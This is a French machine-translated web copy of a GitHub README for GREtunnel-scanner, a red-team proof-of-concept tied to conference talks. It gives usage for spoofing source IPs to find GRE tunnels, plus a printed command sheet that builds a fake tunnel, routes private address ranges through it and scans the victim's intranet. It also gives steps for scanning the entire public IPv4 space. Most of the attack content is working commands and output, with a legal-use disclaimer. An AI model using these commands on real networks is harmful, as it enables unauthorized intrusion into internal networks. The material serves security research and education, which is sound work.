<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GREtunnel-scanner - Ceci est un code PoC GRE pour Talks : De l&#39;usurpation &#224; l&#39;encapsulation : Nouvelles techniques r&#233;seau de l&#39;&#233;quipe rouge pour l&#39;acc&#232;s initial et l&#39;&#233;vasion.</title>
    <meta name="description" content="Ceci est un code PoC GRE pour Talks : De l&#39;usurpation &#224; l&#39;encapsulation : Nouvelles techniques r&#233;seau de l&#39;&#233;quipe rouge pour l&#39;acc&#232;s initial et l&#39;&#233;vasion.">
    <meta name="keywords" content="GREtunnel-scanner, French, documentation, GitHub, open source">
    <meta name="author" content="OpenAiTx">
    <meta name="robots" content="index, follow">
    
    <!-- Structured Data -->
    <script type="application/ld+json">
    {
  "@context": "https://schema.org",
  "@type": "SoftwareApplication",
  "name": "GREtunnel-scanner",
  "description": "Ceci est un code PoC GRE pour Talks : De l'usurpation à l'encapsulation : Nouvelles techniques réseau de l'équipe rouge pour l'accès initial et l'évasion.",
  "author": {
    "@type": "Person",
    "name": "123ojp"
  },
  "applicationCategory": "DeveloperApplication",
  "operatingSystem": "Any",
  "offers": {
    "@type": "Offer",
    "price": "0",
    "priceCurrency": "USD"
  },
  "aggregateRating": {
    "@type": "AggregateRating",
    "ratingValue": "5",
    "ratingCount": 80
  },
  "url": "https://OpenAiTx.github.io/projects/123ojp/GREtunnel-scanner/README-fr.html",
  "sameAs": "https://raw.githubusercontent.com/123ojp/GREtunnel-scanner/main/README.md",
  "datePublished": "2025-10-11",
  "dateModified": "2025-10-11"
}
    </script>
    
    <!-- GitHub-style CSS -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            line-height: 1.6;
            color: #24292e;
            background-color: #ffffff;
            max-width: 980px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .container {
            background: #ffffff;
            border: 1px solid #e1e4e8;
            border-radius: 6px;
            padding: 24px;
            margin-bottom: 20px;
        }
        
        .header {
            border-bottom: 1px solid #e1e4e8;
            padding-bottom: 16px;
            margin-bottom: 24px;
        }
        
        .project-title {
            font-size: 2em;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .project-title a {
            color: #24292e;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: color 0.2s ease;
        }
        
        .project-title a:hover {
            color: #0366d6;
            text-decoration: none;
        }
        
        .project-title .github-icon {
            width: 1em;
            height: 1em;
            fill: currentColor;
            opacity: 0.7;
            transition: opacity 0.2s ease;
        }
        
        .project-title a:hover .github-icon {
            opacity: 1;
        }
        
        .project-meta {
            color: #586069;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .stars {
            display: inline-block;
            margin-right: 16px;
        }
        
        .language {
            display: inline-block;
            background-color: #f1f8ff;
            color: #0366d6;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 500;
        }
        
        .content {
            font-size: 16px;
            line-height: 1.6;
        }
        
        h1, h2, h3, h4, h5, h6 {
            margin-top: 24px;
            margin-bottom: 16px;
            font-weight: 600;
            line-height: 1.25;
            color: #24292e;
        }
        
        h1 { font-size: 2em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
        h2 { font-size: 1.5em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
        h3 { font-size: 1.25em; }
        
        p {
            margin-bottom: 16px;
        }
        
        code {
            background-color: #f6f8fa;
            border-radius: 3px;
            font-size: 85%;
            margin: 0;
            padding: 0.2em 0.4em;
            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
        }
        
        pre {
            background-color: #f6f8fa;
            border-radius: 6px;
            font-size: 85%;
            line-height: 1.45;
            overflow: auto;
            padding: 16px;
            margin-bottom: 16px;
        }
        
        pre code {
            background-color: transparent;
            border: 0;
            display: inline;
            line-height: inherit;
            margin: 0;
            overflow: visible;
            padding: 0;
            word-wrap: normal;
        }
        
        a {
            color: #0366d6;
            text-decoration: none;
        }
        
        a:hover {
            text-decoration: underline;
        }
        
        ul, ol {
            margin-bottom: 16px;
            padding-left: 2em;
        }
        
        li {
            margin-bottom: 0.25em;
        }
        
        blockquote {
            border-left: 4px solid #dfe2e5;
            color: #6a737d;
            margin: 0 0 16px 0;
            padding: 0 1em;
        }
        
        .footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #e1e4e8;
            color: #586069;
            font-size: 14px;
            text-align: center;
        }
        
        .footer a {
            color: #0366d6;
        }
        
        .original-link {
            margin-top: 16px;
            padding: 12px;
            background-color: #f6f8fa;
            border-radius: 6px;
            border: 1px solid #e1e4e8;
        }
        
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .container {
                padding: 16px;
            }
            
            .project-title {
                font-size: 1.5em;
            }
        }
    </style>
    
    <!-- Prism.js for syntax highlighting -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>

    <!-- Bing Count -->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "sh95yd6uwt");
    </script>        

    <!-- Statcounter -->
    <script type="text/javascript">
        var sc_project = 13142514;
        var sc_invisible = 1;
        var sc_security = "d03a31d8"; 
    </script>
    <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
    <noscript>
        <div class="statcounter"><a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img
                    class="statcounter" src="https://c.statcounter.com/13142514/0/d03a31d8/1/" alt="Web Analytics"
                    referrerPolicy="no-referrer-when-downgrade"></a></div>
    </noscript>    
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="project-title">
                <a href="https://github.com/123ojp/GREtunnel-scanner" target="_blank" rel="noopener noreferrer">
                    <svg class="github-icon" viewBox="0 0 16 16" aria-hidden="true">
                        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
                    </svg>
                    GREtunnel-scanner
                </a>
            </h1>
            <div class="project-meta">
                <span class="stars">⭐ 80 stars</span>
                <span class="language">French</span>
                <span>by 123ojp</span>
            </div>
        </div>
        
        <div class="content">
            <h1>Scanner de tunnel GRE</h1>
<h2>⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️</h2>
<h3>⚠️Cet outil inclut la falsification des adresses IP source. Veuillez vous assurer que vous disposez d'une autorisation légale pour l'utiliser.⚠️</h3>
<h2>Référence</h2>
<ul><li>Ceci est un code PoC pour les conférences : From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion</li>
    <li><a href="https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678" target="_blank" rel="noopener noreferrer">Black Hat USA 2025 Briefing</a></li>
    <li><a href="https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316" target="_blank" rel="noopener noreferrer">DEF CON 33 Main Stage</a></li>
    <li><a href="https://hitcon.org/2025/en-US/agenda/" target="_blank" rel="noopener noreferrer">HITCON 2025</a></li>
</ul><h2>Préparation</h2>
<ul><li><code>pip3 install requirement.txt</code></li>
</ul><h2>Utilisation</h2>
<pre><code class="language-">python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile></code></pre>
<h2>Exemple</h2>
<ul><li>par exemple <code>1.1.1.1</code> et <code>2.2.2.2</code> ont un tunnel gre, vous êtes <code>3.3.3.3</code></li>
</ul><pre><code class="language-">python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1</code></pre>
<ul><li>Et comprendre comment exploiter un tunnel GRE</li>
</ul><pre><code class="language-">python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280</p><h2>route possible private ip ##</h2>
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP</p><h3>start scan intranet ###</h3>
#### !IMPORTANT! ####
<h1>!! nmap is not available for this kind of attack use fping instead !! #</h1>
<h1>fping -g 192.168.0.0/16</h1></p><h3>cleanup ###</h3>
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1</code></pre></p><ul><li>si vous connaissez le point de terminaison mais pas l'adresse du pair, vous pouvez faire quelque chose comme ceci  </li>
  <li><code>python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8</code>  </li>
  <li>vous recevrez une réponse de 8.8.8.8 tout en obtenant le bon pair  </li></p><p><li>réglage par défaut environ 500 paquets/seconde.  </li>
</ul><h2>options  </h2>
<ul><li><code>-sch</code> : Affiche la feuille de triche et quitte (Entrez -i -lh -s -d que vous avez trouvé puis obtenez la commande d'abus du tunnel GRE)  </li>
<li><code>-l3</code> : Interface tunnel couche 3 (Par défaut : Faux)  </li>
<li><code>-r</code> : Place l’IP de destination GRE dans ICMP (Par défaut : Place l’IP source GRE)  </li>
<li><code>-ss</code> : Sauvegarde et utilise un fichier d’état (la dernière analyse reprendra) (Par défaut : Faux)  </li>
  <li>Recommandé "on" dans un système de scan massif, parfois le script plante  </li>
<li><code>-i <interface></code> : Interface pour envoyer les paquets  </li>
<li><code>-s <ip_ou_fichier></code> : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme source GRE  </li>
<li><code>-d <ip_ou_fichier></code> : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme destination GRE  </li>
<li><code>-L <fichier></code> : scanner une liste de pairs GRE  </li>
  <li>fichier, chaque ligne ressemble à ceci <code>1.1.1.1,2.2.2.2</code>  </li>
<li><code>-lh <ip></code> : Une IP sur votre interface publique (l’IP sur l’interface -i)  </li>
<li><code>-o <fichier></code> : Chemin du fichier log  </li>
<li><code>-t <float></code> : Attendre combien de secondes après l’envoi du paquet GRE (Par défaut : 2)  </li>
<li><code>-T <int></code> : Combien de threads envoient des paquets GRE en même temps (Par défaut : 255)  </li>
<li><code>-cs <int></code> : Envoyer combien d’IPs avant de commencer à attendre la réponse ping (par défaut : 1000)  </li>
<li><code>-dp</code> : Faire privé - scanner les IP privées GRE (Par défaut : Faux)  </li>
<li><code>-id <ip></code> : Adresse destination dans ICMP (Par défaut : même que la destination GRE)  </li>
  <li>Utilisez ceci si vous connaissez l’adresse intranet interne  </li>
<li><code>-v <niveau_log></code> : Niveau de log <code>['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']</code> (Par défaut : INFO)  </li>
  <li>Le log de détection de pair GRE est sur <code>CRITICAL</code>  </li></p><p>
</ul><h2>meilleure façon de scanner l’IP publique complète</h2>
<pre><code class="language-">wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss</code></pre></p><h2>Laboratoire</h2>
<h3>Vidéo de démonstration</h3>
<ul><li><a href="https://youtu.be/DDvfYl5-J28" target="_blank" rel="noopener noreferrer">Youtube</a></li>
</ul><h3>Scanner un tunnel GRE</h3>
<code>python3 main.py -i <iface> -lh <votre_ip> -s 1.1.1.1 -d 160.25.104.199</code>
<h3>Accéder et scanner l'intranet</h3>
<pre><code class="language-">#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
<h3>start scan intranet ###</h3>
fping -g 192.168.0.0/16</p><p>##### scan output #####
<h1>192.168.1.2 is alive</h1></p><h2>test curl to web ##</h2>
curl 192.168.1.2
<h1>YOU KNOW GRE!</h1></p><p>#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1</code></pre>
<h2>Avertissement  </h2>
Ce projet est destiné uniquement à des fins éducatives et de recherche. Toute action et/ou activité liée à ce code est de votre seule responsabilité. Les auteurs et contributeurs ne sont pas responsables de toute mauvaise utilisation ou dommage causé par ce projet. Veuillez vous assurer que vous disposez des autorisations appropriées avant de tester, utiliser ou déployer une partie de ce code dans n'importe quel environnement. L'utilisation non autorisée de ce code peut enfreindre les lois locales, étatiques et fédérales.  </p><h2>Licence  </h2>
Ce projet est sous licence MIT.</p><p>
---

Tranlated By <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">Open Ai Tx</a> | Last indexed: 2025-10-11

---</p>
        </div>
        
        <div class="original-link">
            <strong>Original README:</strong> <a href="https://raw.githubusercontent.com/123ojp/GREtunnel-scanner/main/README.md" target="_blank" rel="noopener noreferrer">View on GitHub</a>
        </div>
    </div>
    
    <div class="footer">
        <p>Translated by <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">OpenAiTx</a> | 
        Last updated: 2025-10-11 
    </div>
    
</body>
</html>